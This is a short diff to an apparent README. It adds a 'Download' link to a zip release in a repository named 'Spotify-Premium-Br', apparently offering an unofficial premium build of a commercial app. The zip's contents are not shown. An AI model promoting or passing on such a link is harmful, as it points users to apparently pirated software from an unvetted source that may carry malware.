@@ -1,3 +1,5 @@
+|[Download](https://github.com/MoulayAh/Spotify-Premium-Br/releases/download/download/v17.2.11.zip)
+|:------------- |
 
 ![original-8953c5cfc4bf26578308d60adb6069e6](https://github.com/user-attachments/assets/2d655fad-f9fd-4cad-82df-6c67a43290f0)
 
